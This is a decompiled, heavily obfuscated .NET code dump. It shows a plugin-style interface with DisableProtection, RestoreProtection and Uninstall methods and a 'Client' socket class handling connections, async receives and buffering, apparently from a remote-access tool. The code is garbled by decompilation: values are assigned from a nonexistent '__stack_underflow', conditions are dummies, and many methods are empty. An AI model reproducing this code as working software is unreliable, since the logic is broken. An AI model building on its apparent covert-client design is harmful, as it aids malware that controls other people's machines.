    #=qKtJTKEkNf2mJVHcZzSW8iQIcsBglzcJJOkX7V_uB55w=();
    return;
}
// #=qZvjD49iuetyLKBIiF$ZmjA==
public void Shutdown()
{
    #=q8Bp27fhtrXMmonNxf$9qLbuQQehIBQTdOPDQw07FUyI=();
    return;
}
// #=qZvjD49iuetyLKBIiF$ZmjA==
public void DisableProtection()
{
    #=q4N2IYJkFi2VWiCVDKVND$8gixU$DXUcX8F2LiLBxLHw=();
    return;
}
// #=qZvjD49iuetyLKBIiF$ZmjA==
public void RestoreProtection()
{
    #=qoKFLFqm7bb3VWsU2QKXIQ4_6anGbTCWiZAfrNlgq8fc=();
    return;
}
// #=qZvjD49iuetyLKBIiF$ZmjA==
public void Uninstall()
{
    #=qaCmGqb7phy5lq$DAzhK3vB71XCZSvhKm3BtGKq_xBto=();
    return;
}
// Client
public void .ctor()
{
    System.Guid local0;

    if (4 != 0)
    {
        __stack_underflow.#=qABNlGFDc7nOg_C39swAcLA== = __stack_underflow;
    }
    if (-1 != 0)
    {
        __stack_underflow.#=qiCTCgJQkyH_Kzq$FT43G4Q== = __stack_underflow;
    }
    if (2 != 0)
    {
        __stack_underflow.#=qcyVktfYxc51I1XopnwGNjQ== = __stack_underflow;
    }
    this.#=qe99VPFgyNENK$KtARK_iPuwvOEw_NRgC00PdG55dmGA= = 10485760;
    this.#=qFlz$$vhlrnZb7YOji0eF_QZBzkOajT0w3UoQbgnXVIA= = 2500;
    this.#=qikBX_CmS$ZzVAuq$nQJBDwmLm5Gee1iPlPuvI188Ejo= = 8000;
    this.#=q$bBbU_xpGfMMkAvp45SBRg== = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(new System.Object());
    this.#=qstAyOBsDsJqFRKDvXIn01A== = true;
    local0 = System.Guid.NewGuid();
    this.#=qA5pFz5LZPgfUa5zon4beRA== = local0.ToString();
    return;
}
// Client
public void .ctor(System.Net.Sockets.Socket arg1, bool arg2, int arg3, int arg4, bool arg5)
{
    System.Guid local0;

    if (-1 != 0)
    {
        __stack_underflow.#=qABNlGFDc7nOg_C39swAcLA== = __stack_underflow;
    }
    if (0 == 0)
    {
        __stack_underflow.#=qiCTCgJQkyH_Kzq$FT43G4Q== = __stack_underflow;
    }
    if (8 != 0)
    {
        __stack_underflow.#=qcyVktfYxc51I1XopnwGNjQ== = __stack_underflow;
    }
    this.#=qe99VPFgyNENK$KtARK_iPuwvOEw_NRgC00PdG55dmGA= = 10485760;
    this.#=qFlz$$vhlrnZb7YOji0eF_QZBzkOajT0w3UoQbgnXVIA= = 2500;
    this.#=qikBX_CmS$ZzVAuq$nQJBDwmLm5Gee1iPlPuvI188Ejo= = 8000;
    this.#=q$bBbU_xpGfMMkAvp45SBRg== = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(new System.Object());
    this.#=qc3tkHe_7v$eGA2x6krh72Q== = arg1;
    local0 = System.Guid.NewGuid();
    this.#=qA5pFz5LZPgfUa5zon4beRA== = local0.ToString();
    this.#=qhiSO75CpxncaWptyc0vAMQ== = true;
    this.#=qU_UZ3uhfwWgI9uBw5HT3xA== = (ushort)((IPEndPoint)arg1.LocalEndPoint).Port;
    this.#=qABNlGFDc7nOg_C39swAcLA== = arg2;
    this.#=qiCTCgJQkyH_Kzq$FT43G4Q== = arg3;
    this.#=qcyVktfYxc51I1XopnwGNjQ== = arg4;
    this.#=q3fzZpU7POi9yYKua762KimE0tXDV2VRrjyJcPuwXgTs= = arg5;
    this.#=qRxyF5FV01AHvUkR3BeX8OA==();
    this.#=qyxpfolLUhMvFTDE2h_syvQ==(arg1);
    return;
}
// Client
public void #=qGjStw3GYbvUue5kapeAzmPJAl5$UDUb723PSvMiCGdU=(#=qFU5Nq8bBPIPoBGBl$k8ehEhmgSoFzsflrFNnOQsCK6E= arg1)
{
    if (2 != 0)
    {
        __stack_underflow.#=qlV3FbiF00r5Vrp5nqoncyxDHZMuHB7yuJa7xS77K3BQ= = __stack_underflow;
    }
    return;
}
// Client
public void #=q9tI5WfBIFIPW_84mZnHV05cJ9fSyOCl9wA8lwPxs3PQ=(#=qFU5Nq8bBPIPoBGBl$k8ehEhmgSoFzsflrFNnOQsCK6E= arg1)
{
    if (-1 != 0)
    {
        __stack_underflow.#=qlV3FbiF00r5Vrp5nqoncyxDHZMuHB7yuJa7xS77K3BQ= = __stack_underflow;
    }
    return;
}
// Client
public void #=qEQtWieYw8BPdEE4hbsjTLrq$BwGjJOBoaDYJmV9xVgE=(#=qKqE6jaRKu5jJvHl8RwywXQDv4h_f2ISEaHK__Drdd$M= arg1)
{
    if (6 != 0)
    {
        __stack_underflow.#=q3C4Iol1nMl5AFLWNdE6nxB2_kG0uXzx35vvsn$gQzt8= = __stack_underflow;
    }
    return;
}
// Client
public void #=qrYH2MBQ1J6Wu3hhoHHVW0JQwxTYC8hYBTLbQIYHNBds=(#=qKqE6jaRKu5jJvHl8RwywXQDv4h_f2ISEaHK__Drdd$M= arg1)
{
    if (4 != 0)
    {
        __stack_underflow.#=q3C4Iol1nMl5AFLWNdE6nxB2_kG0uXzx35vvsn$gQzt8= = __stack_underflow;
    }
    return;
}
// Client
public void #=qDTvHA26pSwiGBDknUzewBVNt3YGW7YeSiQRH8F$_CMA=(#=qdy_NHDvN7XTcQtWWMYxYKbuJqtXHsYJXM_YUEvVR0bc= arg1)
{
    if (6 != 0)
    {
        __stack_underflow.#=q2dXdGRU_h62YVIUhgXBQJzEnralpXNvp017RQs19jjo= = __stack_underflow;
    }
    return;
}
// Client
public void #=qEqEPF0jj3sUIryvQNEKKCV9boaHFZuHXMROqSn28L3g=(#=qdy_NHDvN7XTcQtWWMYxYKbuJqtXHsYJXM_YUEvVR0bc= arg1)
{
    if (1 != 0)
    {
        __stack_underflow.#=q2dXdGRU_h62YVIUhgXBQJzEnralpXNvp017RQs19jjo= = __stack_underflow;
    }
    return;
}
// Client
public void #=qQoUfP$jAQrKMjDuqm54QmA==(#=q$XurN5kwCvUuDGDncP4myluEGVmoB5AfvTb_Ct0PT5c= arg1)
{
    if (3 != 0)
    {
        __stack_underflow.#=qP_nucp5xdFjeAVWRfZ2XfmvYhkwWbeeu3y2fkxvS0yA= = __stack_underflow;
    }
    return;
}
// Client
public void #=qvLrEXVjSw17e3P6GFPALhrZXcKcfxuk0NupQhKFf0VM=(#=q$XurN5kwCvUuDGDncP4myluEGVmoB5AfvTb_Ct0PT5c= arg1)
{
    if (4 != 0)
    {
        __stack_underflow.#=qP_nucp5xdFjeAVWRfZ2XfmvYhkwWbeeu3y2fkxvS0yA= = __stack_underflow;
    }
    return;
}
// Client
public void #=qwWiTcboLi4zF4ycKWLBprqWhuc6ZDNNDjC8OE8DG1$c=(#=qQtwc_i6uv63Hs$aOrPLxrMU9lMXbhRW79NANZrRxozw= arg1)
{
    if (1 != 0)
    {
        __stack_underflow.#=qeXI2ChPq1TaKaY8cTwWe4uWAyXSGUqAWxM21uH$6gYc= = __stack_underflow;
    }
    return;
}
// Client
public void #=qccx4d_xNMPrZUHpmyYb7fIKkXAFa5XEyOIxXg$XLtBw=(#=qQtwc_i6uv63Hs$aOrPLxrMU9lMXbhRW79NANZrRxozw= arg1)
{
    if (1 != 0)
    {
        __stack_underflow.#=qeXI2ChPq1TaKaY8cTwWe4uWAyXSGUqAWxM21uH$6gYc= = __stack_underflow;
    }
    return;
}
// Client
public void #=qXKuFJhTO9qh0nlK1iXbbSH7y8Djn0mggfIDxOoarDyE=(#=q1kCP32T3CbXwL6JS3UekkltOicB4KjO4W45iMQoNvNk= arg1)
{
    if (-1 != 0)
    {
        __stack_underflow.#=qrWKlHKCxTKueolOR4ohc7D_cBhjLv1zNIcftgcigaGU= = __stack_underflow;
    }
    return;
}
// Client
public void #=qO0bmWYqIZnaB7Udo1OTvUuiP36Q9Z_7hz6URm1Yr1hM=(#=q1kCP32T3CbXwL6JS3UekkltOicB4KjO4W45iMQoNvNk= arg1)
{
    if (6 != 0)
    {
        __stack_underflow.#=qrWKlHKCxTKueolOR4ohc7D_cBhjLv1zNIcftgcigaGU= = __stack_underflow;
    }
    return;
}
// Client
public void #=qtT$P2Bo4VHFu60OU4VLf1H20c7M2DlURuyfb_XJDYaM=(#=qFMsFc_zvkhu_B2YTPJt9Yux7Vq8aZNOr3FA$mEdAzCc= arg1)
{
    if (0 == 0)
    {
        __stack_underflow.#=q3d9CqFPpPy$rBhZvyFIRs_ElAFMHTo4ZZuE_g$Nfrnk= = __stack_underflow;
    }
    return;
}
// Client
public void #=qBuMzaVqxpYkDVtTnLpbYyjTfZNKm8_4JkuoFHPxOBFo=(#=qFMsFc_zvkhu_B2YTPJt9Yux7Vq8aZNOr3FA$mEdAzCc= arg1)
{
    if (8 != 0)
    {
        __stack_underflow.#=q3d9CqFPpPy$rBhZvyFIRs_ElAFMHTo4ZZuE_g$Nfrnk= = __stack_underflow;
    }
    return;
}
// Client
public void #=qs77tphQ2NXlLwCZkimhHsowpXGqSYmOGtKiGHHIs4aA=(#=qRHdMxv5xMrip5nI3eHU3Y52nJ9DhG_ImQVoJh$ooupk= arg1)
{
    if (5 != 0)
    {
        __stack_underflow.#=qe9p_PgOCiouYWahOSDKth00dr9CdsTb1R3DYgCeLUBw= = __stack_underflow;
    }
    return;
}
// Client
public void #=q85afbI_HcqBFOZnC0iAqsNghLb3LsuyjFtpLEYYoPX8=(#=qRHdMxv5xMrip5nI3eHU3Y52nJ9DhG_ImQVoJh$ooupk= arg1)
{
    if (3 != 0)
    {
        __stack_underflow.#=qe9p_PgOCiouYWahOSDKth00dr9CdsTb1R3DYgCeLUBw= = __stack_underflow;
    }
    return;
}
// Client
public bool #=qbNq0eOj9Pw66KrsrDd4qnA==()
{
    return ((2 != 0 ? this : this)).#=qABNlGFDc7nOg_C39swAcLA==;
}
// Client
public void #=qnDc3CmkCB1QeN2dXbmqV1Q==(bool arg1)
{
    if (!(!this.#=qHiBdWLOLLVg67b8lN8FRqgmYNWZfcDieu2MH9_zIY6Q=()))
    {
        throw new System.Exception(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516960498));
    }
    if (4 != 0)
    {
        __stack_underflow.#=qABNlGFDc7nOg_C39swAcLA== = __stack_underflow;
    }
    return;
}
// Client
public int #=q5esm6BVWqrzEai7Zgw0cmQ==()
{
    return ((2 != 0 ? this : this)).#=qiCTCgJQkyH_Kzq$FT43G4Q==;
}
// Client
public void #=qz5nGZygXT2sWR5FWGAcAzA==(int arg1)
{
    if (arg1 < 1)
    {
        throw new System.Exception(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516960433));
    }
    if (!(!this.#=qHiBdWLOLLVg67b8lN8FRqgmYNWZfcDieu2MH9_zIY6Q=()))
    {
        throw new System.Exception(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516960498));
    }
    if (2 != 0)
    {
        __stack_underflow.#=qiCTCgJQkyH_Kzq$FT43G4Q== = __stack_underflow;
    }
    return;
}
// Client
public int #=qCPeeDj1tZ3_XePWJJx7FTlBzWHbtSGvCe1Je6nRznW0=()
{
    return ((2 != 0 ? this : this)).#=qcyVktfYxc51I1XopnwGNjQ==;
}
// Client
public void #=q8GRQigucU81Rfg9VpK7PVLcjulhhYVPijYKMm9N3PJs=(int arg1)
{
    if (arg1 < 1)
    {
        throw new System.Exception(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516960433));
    }
    if (8 != 0)
    {
        __stack_underflow.#=qcyVktfYxc51I1XopnwGNjQ== = __stack_underflow;
    }
    return;
}
// Client
public bool #=qAzhW8LcEnUCELlhG4klMCnw00GcHco1N61RthSA9zQU=()
{
    return ((6 != 0 ? this : this)).#=q3fzZpU7POi9yYKua762KimE0tXDV2VRrjyJcPuwXgTs=;
}
// Client
public void #=q8eJA0L4q0RMnuOJCvpFj3133vZRxVnxvHST9vysUWYQ=(bool arg1)
{
    if (1 != 0)
    {
        __stack_underflow.#=q3fzZpU7POi9yYKua762KimE0tXDV2VRrjyJcPuwXgTs= = __stack_underflow;
    }
    return;
}
// Client
public int #=qGxD085Z3RQaUY4iGwWH$xgEmRYVWDAN6hxNjaXokfVc=()
{
    return ((1 != 0 ? this : this)).#=qe99VPFgyNENK$KtARK_iPuwvOEw_NRgC00PdG55dmGA=;
}
// Client
public void #=qLEtx_37WeiIPQPYSN8vY0qTNiL_L6nA6vkFQwNlcU2Y=(int arg1)
{
    if (arg1 < 85000)
    {
        throw new System.Exception(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516960341));
    }
    if (7 != 0)
    {
        __stack_underflow.#=qe99VPFgyNENK$KtARK_iPuwvOEw_NRgC00PdG55dmGA= = __stack_underflow;
    }
    return;
}
// Client
public int #=q0uUZuMiILVbPeB$t7lx1a0Is1IW4CfkB9ovgW99kERQ=()
{
    return ((5 != 0 ? this : this)).#=qFlz$$vhlrnZb7YOji0eF_QZBzkOajT0w3UoQbgnXVIA=;
}
// Client
public void #=qRxKU0X3UfYwXoOTtDpEVW6z4XRgE1s4V5zOQsfCCSqM=(int arg1)
{
    if (0 == 0)
    {
        __stack_underflow.#=qFlz$$vhlrnZb7YOji0eF_QZBzkOajT0w3UoQbgnXVIA= = __stack_underflow;
    }
    return;
}
// Client
public int #=q8nWzev5go3NKhN5Gk9NzTmM91eKwrK00n3U6GWmH8Kc=()
{
    return ((0 == 0 ? this : this)).#=qikBX_CmS$ZzVAuq$nQJBDwmLm5Gee1iPlPuvI188Ejo=;
}
// Client
public void #=qm_Podb$DJ6CfxMwMnaj6heXfc210URbSx7p$rJGFPmA=(int arg1)
{
    if (-1 != 0)
    {
        __stack_underflow.#=qikBX_CmS$ZzVAuq$nQJBDwmLm5Gee1iPlPuvI188Ejo= = __stack_underflow;
    }
    return;
}
// Client
public #=q4KMIX0AcXAdYuUiSKvyy9Q== #=qOWs9MBREWujnaIdYgAI1lg==()
{
    return ((5 != 0 ? this : this)).#=qIOX_rwHrS_RLFL2igzRsUQ==;
}
// Client
public void #=qtIl3MhjXHsnCHvTVFi9hFg==(#=q4KMIX0AcXAdYuUiSKvyy9Q== arg1)
{
    if (5 != 0)
    {
        __stack_underflow.#=qIOX_rwHrS_RLFL2igzRsUQ== = __stack_underflow;
    }
    return;
}
// Client
public System.Net.IPEndPoint #=qKraENZVscKMtH4GMIJjzqA==()
{
    if (((7 != 0 ? this : this)).#=qTAs57ZkYafcLC2FZLCGAiQ== == null)
    {
        return new System.Net.IPEndPoint(None, 0);
    }
    return ((0 == 0 ? this : this)).#=qTAs57ZkYafcLC2FZLCGAiQ==;
}
// Client
public string #=qFm7s8q151MPpLODhzLizPw==()
{
    return ((-1 != 0 ? this : this)).#=qfHad4tglpNfnMqZ6nFkPPA==;
}
// Client
public ushort #=qnk9x1Gmlq5UZ_X95yAl14A==()
{
    return ((5 != 0 ? this : this)).#=qU_UZ3uhfwWgI9uBw5HT3xA==;
}
// Client
public bool #=qvvhgGCgMlZiK63M2bP1Kcg==()
{
    return ((7 != 0 ? this : this)).#=qGqugi8s64S3wxXEod1SSyA==;
}
// Client
public bool #=qHiBdWLOLLVg67b8lN8FRqgmYNWZfcDieu2MH9_zIY6Q=()
{
    if (((2 == 0 ? this : this)).#=qGqugi8s64S3wxXEod1SSyA==)
    {
        if (((4 != 0 ? this : this)).#=qhiSO75CpxncaWptyc0vAMQ==)
        {
        }
        return false;
    }
    return true;
}
// Client
public bool #=q3vPs064Rj1jBOLtFVqV4DA==()
{
    return ((-1 != 0 ? this : this)).#=qstAyOBsDsJqFRKDvXIn01A==;
}
// Client
public string #=qibDx9sEkAVZroec7HmNu4g==()
{
    return ((-1 != 0 ? this : this)).#=qA5pFz5LZPgfUa5zon4beRA==;
}
// Client
public bool #=q$P4U7B6$qbq6QJ_QX8MfyNoxYRq3foNT$OZzr5yEqDQ=()
{
    return ((5 != 0 ? this : this)).#=q9VIijSO53lpTS2jV37$Suw==;
}
// Client
public void #=qChHxg92yH05lHO0u7UrDcPo$UK1nFXIjb2DI3pyR0FE=(bool arg1)
{
    if (6 != 0)
    {
        __stack_underflow.#=q9VIijSO53lpTS2jV37$Suw== = __stack_underflow;
    }
    return;
}
// Client
public System.Net.IPAddress[] #=qJMNT6BwQKSi707UHw9_x7oci6egKjto_AgHYlITH34c=()
{
    return ((4 != 0 ? this : this)).#=qgW$Sn0ALOASuZcEZHxiZDaj3mNXTljqLa5onSc7M0U0=;
}
// Client
public void #=qSpdFO0arrQmbwA1JpPKL4TCAmwZYVDNVmpRQ6ryTPgs=(System.Net.IPAddress[] arg1)
{
    if (5 != 0)
    {
        __stack_underflow.#=qgW$Sn0ALOASuZcEZHxiZDaj3mNXTljqLa5onSc7M0U0= = __stack_underflow;
    }
    return;
}
// Client
private void #=qRxyF5FV01AHvUkR3BeX8OA==()
{
    if (4 != 0)
    {
        __stack_underflow.#=qN$clRL1tbKGnARF7__FwJg== = __stack_underflow;
    }
    if (7 != 0)
    {
        __stack_underflow.#=qP5B75c4g32E_HsewCKc$Ig== = __stack_underflow;
    }
    if (6 != 0)
    {
        __stack_underflow.#=q9LcncGbDdZaeonfU3943IQ== = __stack_underflow;
    }
    this.#=q5C_es0qgtlVCNxzfPQ_idg== = new System.Byte[((this.#=qiCTCgJQkyH_Kzq$FT43G4Q== * 2) - 1) + 1];
    this.#=q6uR3lWd6_aD2reKUDlx$OA== = new Queue<byte[]>();
    this.#=qos7yzAcb5jR$ypc0Qk3OWQ== = new System.Net.Sockets.SocketAsyncEventArgs();
    this.#=q8T1neNU8Flp1WaNsBKnRHQ== = new System.Net.Sockets.SocketAsyncEventArgs();
    this.#=qo8wG17V6QHcxsU4R0xmY_Q== = new System.Net.Sockets.SocketAsyncEventArgs();
    this.#=qos7yzAcb5jR$ypc0Qk3OWQ==.SetBuffer(this.#=q5C_es0qgtlVCNxzfPQ_idg==, 0, this.#=qiCTCgJQkyH_Kzq$FT43G4Q==);
    this.#=q8T1neNU8Flp1WaNsBKnRHQ==.SetBuffer(this.#=q5C_es0qgtlVCNxzfPQ_idg==, this.#=qiCTCgJQkyH_Kzq$FT43G4Q==, this.#=qiCTCgJQkyH_Kzq$FT43G4Q==);
    this.#=qos7yzAcb5jR$ypc0Qk3OWQ==.add_Completed(this.#=quebj1wBCmruzAKmg6Y4Igg==);
    this.#=q8T1neNU8Flp1WaNsBKnRHQ==.add_Completed(this.#=quebj1wBCmruzAKmg6Y4Igg==);
    this.#=qo8wG17V6QHcxsU4R0xmY_Q==.add_Completed(this.#=quebj1wBCmruzAKmg6Y4Igg==);
    return;
}
// Client
public void #=qw39MYiiaN1XJbqsDq$LgQw==(string arg1, ushort arg2)
{
    System.Net.IPAddress local0;
    System.Exception local1;
    #=qRHdMxv5xMrip5nI3eHU3Y52nJ9DhG_ImQVoJh$ooupk= local2;

    if (!(this.#=qstAyOBsDsJqFRKDvXIn01A==))
    {
        return;
    }
    try
    {
        if (!this.#=qHiBdWLOLLVg67b8lN8FRqgmYNWZfcDieu2MH9_zIY6Q=())
        {
            if (4 != 0)
            {
                __stack_underflow.#=qfHad4tglpNfnMqZ6nFkPPA== = __stack_underflow;
            }
            if (3 != 0)
            {
                __stack_underflow.#=qU_UZ3uhfwWgI9uBw5HT3xA== = __stack_underflow;
            }
            if (-1 != 0)
            {
                __stack_underflow.#=qhiSO75CpxncaWptyc0vAMQ== = __stack_underflow;
            }
            this.#=qRxyF5FV01AHvUkR3BeX8OA==();
            local0 = None;
            if (!System.Net.IPAddress.TryParse(this.#=qfHad4tglpNfnMqZ6nFkPPA==, ref local0))
            {
                System.Threading.ThreadPool.QueueUserWorkItem(this._Lambda$__7);
            }
            else
            {
                this.#=qlt$K8Ex4tZEPwTl4RuqGMw==(local0, this.#=qU_UZ3uhfwWgI9uBw5HT3xA==);
            }
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// Client
private void #=qA4f0kKyGXTRnU4z03oji_RIPyVnvoC_BRjpESDLHXqY=(string arg1, ushort arg2)
{
    System.Net.IPAddress[] local0;
    System.Net.IPAddress local1;
    System.Exception local2;
    int local3;
    System.Net.IPAddress[] local4;
    #=qRHdMxv5xMrip5nI3eHU3Y52nJ9DhG_ImQVoJh$ooupk= local5;

    try
    {
        if (5 != 0)
        {
            local0 = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// Client
private void #=qIZP8IX60gSYF82kuZejmg8pOoXfEBczapTTwgrWM$fM=(string arg1, ushort arg2, System.Net.IPAddress[] arg3)
{
    System.Net.IPAddress local0;
    System.Exception local1;
    int local2;
    System.Net.IPAddress[] local3;
    #=qFU5Nq8bBPIPoBGBl$k8ehEhmgSoFzsflrFNnOQsCK6E= local4;
    #=qRHdMxv5xMrip5nI3eHU3Y52nJ9DhG_ImQVoJh$ooupk= local5;

    try
    {
        if (this.#=qc3tkHe_7v$eGA2x6krh72Q== == null)
        {
            if (3 != 0)
            {
                local3 = __stack_underflow;
            }
            if (0 == 0)
            {
                local2 = __stack_underflow;
            }
            while (true)
            {
                if (local2 < checked((int)local3.Length))
                {
                    if (6 != 0)
                    {
                        local0 = __stack_underflow;
                    }
                    if (local0.AddressFamily != 2)
                    {
                        local2 = local2 + 1;
                        continue;
                    }
                    local4 = this.#=qlV3FbiF00r5Vrp5nqoncyxDHZMuHB7yuJa7xS77K3BQ=;
                    if (local4 != null)
                    {
                        local4.Invoke(this, arg1, local0);
                    }
                    this.#=qlt$K8Ex4tZEPwTl4RuqGMw==(local0, arg2);
                    return;
                }
            }
        }
    }
    catch (System.Exception ex)
    {
    }
}
// Client
private void #=qlt$K8Ex4tZEPwTl4RuqGMw==(System.Net.IPAddress arg1, ushort arg2)
{
    System.Exception local0;
    #=qRHdMxv5xMrip5nI3eHU3Y52nJ9DhG_ImQVoJh$ooupk= local1;

    try
    {
        if (0 == 0)
        {
            __stack_underflow.#=qc3tkHe_7v$eGA2x6krh72Q== = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// Client
private void #=qPYtEwg1BZk5tP9KKNl$36tqIdWilqjeWcpWKL2Zxnug=(int arg1)
{
    #=q8McCIarwH$XScVz0xkTmJw== local0;

    if (5 != 0)
    {
        local0 = __stack_underflow;
    }
    if (2 != 0)
    {
        __stack_underflow.#=q5$hUSQAZNmEXcUcvGVFJrlqtw6IWJBy6C7LN$kOmTWU= = __stack_underflow;
    }
    if (7 != 0)
    {
        __stack_underflow.#=qd5f1i4cDO3tAO_bEb7g1cw== = __stack_underflow;
    }
    System.Threading.ThreadPool.QueueUserWorkItem(local0._Lambda$__9);
    return;
}
// Client
private void #=qFikK0kKzvE4fvbzxpsrllMMR8oLIJtNPAGP1lZZ4prs=(int arg1)
{
    int local0;
    int local1;

    if (3 != 0)
    {
        local1 = __stack_underflow;
    }
    if (7 != 0)
    {
        local0 = __stack_underflow;
    }
    while (true)
    {
        if (local0 <= local1)
        {
            if (this.#=qhiSO75CpxncaWptyc0vAMQ==)
            {
                System.Threading.Thread.Sleep(20);
                if (1 != 0)
                {
                    local0 = __stack_underflow;
                    continue;
                }
                else
                {
                    continue;
                }
            }
            return;
        }
    }
}
// Client
private void #=qyxpfolLUhMvFTDE2h_syvQ==(System.Net.Sockets.Socket arg1)
{
    System.Exception local0;
    #=qKqE6jaRKu5jJvHl8RwywXQDv4h_f2ISEaHK__Drdd$M= local1;
    #=qRHdMxv5xMrip5nI3eHU3Y52nJ9DhG_ImQVoJh$ooupk= local2;

    try
    {
        this.#=qo8wG17V6QHcxsU4R0xmY_Q==.Dispose();
        if (0 == 0)
        {
            __stack_underflow.#=qo8wG17V6QHcxsU4R0xmY_Q== = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// Client
public void #=qafzQcMCK0eVSctI0IcD2PA==()
{
    if (!(((6 != 0 ? this : this)).#=qc3tkHe_7v$eGA2x6krh72Q==.ReceiveAsync(((-1 != 0 ? this : this)).#=qos7yzAcb5jR$ypc0Qk3OWQ==)))
    {
        ((0 == 0 ? this : this)).#=quebj1wBCmruzAKmg6Y4Igg==(this.#=qc3tkHe_7v$eGA2x6krh72Q==, this.#=qos7yzAcb5jR$ypc0Qk3OWQ==);
    }
    return;
}
// Client
private void #=quebj1wBCmruzAKmg6Y4Igg==(object arg1, System.Net.Sockets.SocketAsyncEventArgs arg2)
{
    bool local0;
    System.Exception local1;
    #=qQtwc_i6uv63Hs$aOrPLxrMU9lMXbhRW79NANZrRxozw= local3;
    #=qFMsFc_zvkhu_B2YTPJt9Yux7Vq8aZNOr3FA$mEdAzCc= local4;
    #=q1kCP32T3CbXwL6JS3UekkltOicB4KjO4W45iMQoNvNk= local5;
    object local6;
    #=qRHdMxv5xMrip5nI3eHU3Y52nJ9DhG_ImQVoJh$ooupk= local7;

    try
    {
        if (!(this.#=qc3tkHe_7v$eGA2x6krh72Q== == null || this.#=qc3tkHe_7v$eGA2x6krh72Q== != arg1))
        {
            if (arg2.SocketError != 0)
            {
                local7 = this.#=qe9p_PgOCiouYWahOSDKth00dr9CdsTb1R3DYgCeLUBw=;
                if (local7 != null)
                {
                    local7.Invoke(this, new System.Net.Sockets.SocketException(arg2.SocketError));
                }
                this.#=quOBOxPeAl_kjKKx$REI6dA==();
            }
            else
            {
                switch (arg2.LastOperation - 2)
                {
                    case 0:
                        this.#=qyxpfolLUhMvFTDE2h_syvQ==(this.#=qc3tkHe_7v$eGA2x6krh72Q==);
                        break;
                    case 1:
IL_01CF:;
                        break;
                    case 2:
                        if (arg2.BytesTransferred != 0)
                        {
                            if (!(!this.#=q3fzZpU7POi9yYKua762KimE0tXDV2VRrjyJcPuwXgTs=))
                            {
                                if (5 != 0)
                                {
                                    local3 = __stack_underflow;
                                }
                                if (local3 != null)
                                {
                                    local3.Invoke(this, arg2.BytesTransferred);
                                }
                            }
                            this.#=qdiuHngY4wejUsgFY5u7CtQ==(arg2.Buffer, 0, arg2.BytesTransferred);
                            if (!(this.#=qc3tkHe_7v$eGA2x6krh72Q==.ReceiveAsync(arg2)))
                            {
                                this.#=quebj1wBCmruzAKmg6Y4Igg==(this.#=qc3tkHe_7v$eGA2x6krh72Q==, arg2);
                            }
                        }
                        else
                        {
                            this.#=quOBOxPeAl_kjKKx$REI6dA==();
                        }
                        break;
                    case 3:
                        goto IL_01CF;
                    case 4:
                        goto IL_01CF;
                    case 5:
                        if (!(!this.#=qABNlGFDc7nOg_C39swAcLA== || this.#=qDJ0VTVPWfAWYghKX_DdnsQ== != 0))
                        {
                            if (2 != 0)
                            {
                                __stack_underflow.#=qDJ0VTVPWfAWYghKX_DdnsQ== = __stack_underflow;
                            }
                        }
                        if (6 != 0)
                        {
                            __stack_underflow.#=qDJ0VTVPWfAWYghKX_DdnsQ== = __stack_underflow;
                        }
                        if (!(!this.#=q3fzZpU7POi9yYKua762KimE0tXDV2VRrjyJcPuwXgTs=))
                        {
                            if (8 != 0)
                            {
                                local4 = __stack_underflow;
                            }
                            if (local4 != null)
                            {
                                local4.Invoke(this, arg2.BytesTransferred);
                            }
                        }
                        if (this.#=qDJ0VTVPWfAWYghKX_DdnsQ== == checked((int)this.#=q9LcncGbDdZaeonfU3943IQ==.Length))
                        {
                            if (6 != 0)
                            {
                                local0 = __stack_underflow;
                            }
                            local5 = this.#=qrWKlHKCxTKueolOR4ohc7D_cBhjLv1zNIcftgcigaGU=;
                            if (local5 != null)
                            {
                                local5.Invoke(this, checked((int)this.#=q9LcncGbDdZaeonfU3943IQ==.Length));
                            }
                        }
                        local6 = this.#=q$bBbU_xpGfMMkAvp45SBRg==;
                        Microsoft.VisualBasic.CompilerServices.ObjectFlowControl.CheckForSyncLockOnValueType(local6);
                        System.Threading.Monitor.Enter(local6);
                        try
                        {
                            if (this.#=q6uR3lWd6_aD2reKUDlx$OA==.Count != 0 || !local0)
                            {
                                this.#=q7uQjJN4fKJgs403tXnERFbQ1VWp3FBsMW_1ZAWZtc1g=();
                            }
                            else
                            {
                                this.#=qMoRe_p4fasg7BcMJcnicWw== = false;
                                System.Array.Resize(ref this.#=q9LcncGbDdZaeonfU3943IQ==, 0);
                                if (this.#=qDJ0VTVPWfAWYghKX_DdnsQ== >= this.#=qe99VPFgyNENK$KtARK_iPuwvOEw_NRgC00PdG55dmGA=)
                                {
                                    System.GC.Collect();
                                }
                                this.#=qDJ0VTVPWfAWYghKX_DdnsQ== = 0;
                            }
                        }
                        finally
                        {
                        }
                        break;
                    default:
                        break;
                }
            }
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// Client
private void #=qdiuHngY4wejUsgFY5u7CtQ==(byte[] arg1, int arg2, int arg3)
{
    int local0;
    int local1;
    int local2;
    #=q$XurN5kwCvUuDGDncP4myluEGVmoB5AfvTb_Ct0PT5c= local3;
    #=qRHdMxv5xMrip5nI3eHU3Y52nJ9DhG_ImQVoJh$ooupk= local4;

    if (!this.#=qABNlGFDc7nOg_C39swAcLA==)
    {
        System.Array.Resize(ref this.#=qP5B75c4g32E_HsewCKc$Ig==, arg3);
        System.Buffer.BlockCopy(arg1, 0, this.#=qP5B75c4g32E_HsewCKc$Ig==, 0, arg3);
        local3 = this.#=qP_nucp5xdFjeAVWRfZ2XfmvYhkwWbeeu3y2fkxvS0yA=;
        if (local3 != null)
        {
            local3.Invoke(this, this.#=qP5B75c4g32E_HsewCKc$Ig==);
        }
    }
    else
    {
        if (!this.#=qgBCfMYp3J4fCYU13EId5uw==)
        {
            if (4 != 0)
            {
                local1 = __stack_underflow;
            }
            System.Buffer.BlockCopy(arg1, arg2, this.#=qN$clRL1tbKGnARF7__FwJg==, this.#=qOgcjmweVxeuvMU4cvcFOmg==, local1);
            arg2 = arg2 + local1;
            this.#=qOgcjmweVxeuvMU4cvcFOmg== = this.#=qOgcjmweVxeuvMU4cvcFOmg== + local1;
